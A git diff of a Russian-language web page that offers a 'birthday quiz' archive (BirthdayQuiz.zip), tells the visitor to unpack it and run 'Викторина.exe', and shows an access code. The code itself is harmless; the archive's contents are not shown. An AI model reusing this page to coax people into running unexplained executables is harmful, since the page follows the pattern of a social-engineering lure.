@@ -1,37 +1,149 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Скачать</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Скачать викторину</title>
     <style>
         body {
             margin: 0;
-            padding: 0;
-            background: black;
+            padding: 20px;
+            background: #0a0a0a;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            min-height: 100vh;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
             align-items: center;
-            height: 100vh;
+            justify-content: center;
+            text-align: center;
         }
+        
+        .container {
+            max-width: 600px;
+            width: 100%;
+            padding: 20px;
+        }
+        
+        .title {
+            font-size: 28px;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px #00ff00;
+        }
+        
+        .subtitle {
+            color: #888;
+            margin-bottom: 30px;
+            font-size: 16px;
+        }
+        
         .download-btn {
-            padding: 25px 60px;
-            font-size: 24px;
-            font-weight: bold;
-            background: #00ff00;
-            color: black;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-            text-decoration: none;
             display: inline-block;
+            background: linear-gradient(45deg, #00ff00, #008800);
+            color: #000;
+            padding: 20px 50px;
+            font-size: 22px;
+            font-weight: bold;
+            text-decoration: none;
+            border-radius: 8px;
+            border: 2px solid #00ff00;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
+            margin: 20px 0;
+            transition: all 0.3s;
+            cursor: pointer;
         }
+        
         .download-btn:hover {
-            background: #00cc00;
             transform: scale(1.05);
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.8);
+        }
+        
+        .instructions {
+            background: rgba(0, 255, 0, 0.1);
+            border: 1px solid rgba(0, 255, 0, 0.3);
+            border-radius: 8px;
+            padding: 20px;
+            margin-top: 30px;
+            text-align: left;
+            font-size: 14px;
+        }
+        
+        .code-box {
+            background: #111;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            font-family: monospace;
+            color: #ff5555;
+            border: 1px solid #333;
+        }
+        
+        .error {
+            color: #ff5555;
+            margin-top: 20px;
+            font-size: 14px;
+            display: none;
         }
     </style>
 </head>
 <body>
-    <a href="BirthdayQuiz39.zip" class="download-btn" download>СКАЧАТЬ</a>
+    <div class="container">
+        <h1 class="title">🎂 Викторина на День Рождения</h1>
+        <p class="subtitle">Специальная программа для именинника</p>
+        
+        <a href="BirthdayQuiz.zip" class="download-btn" download id="downloadLink">
+            ⬇ СКАЧАТЬ ВИКТОРИНУ
+        </a>
+        
+        <div class="instructions">
+            <p><strong>Инструкция:</strong></p>
+            <p>1. Нажмите кнопку "СКАЧАТЬ ВИКТОРИНУ" выше</p>
+            <p>2. Сохраните файл BirthdayQuiz.zip</p>
+            <p>3. Распакуйте архив в любую папку</p>
+            <p>4. Запустите файл <strong>Викторина.exe</strong></p>
+            <p>5. Следуйте инструкциям в программе</p>
+            
+            <div class="code-box">
+                <strong>Код доступа:</strong> 198701202639
+            </div>
+        </div>
+        
+        <div class="error" id="errorMessage">
+            Если файл не скачивается, возможно он еще загружается на сервер.
+            Попробуйте обновить страницу через несколько минут.
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const downloadLink = document.getElementById('downloadLink');
+            const errorMessage = document.getElementById('errorMessage');
+            
+            // Проверяем доступность файла
+            fetch('BirthdayQuiz.zip')
+                .then(response => {
+                    if (!response.ok) {
+                        errorMessage.style.display = 'block';
+                        downloadLink.style.opacity = '0.7';
+                        downloadLink.style.cursor = 'not-allowed';
+                        downloadLink.onclick = function(e) {
+                            e.preventDefault();
+                            alert('Файл временно недоступен. Попробуйте позже.');
+                        };
+                    }
+                })
+                .catch(() => {
+                    errorMessage.style.display = 'block';
+                });
+            
+            // Эффект клика
+            downloadLink.addEventListener('click', function() {
+                this.style.transform = 'scale(0.95)';
+                setTimeout(() => {
+                    this.style.transform = 'scale(1)';
+                }, 200);
+            });
+        });
+    </script>
 </body>
 </html>
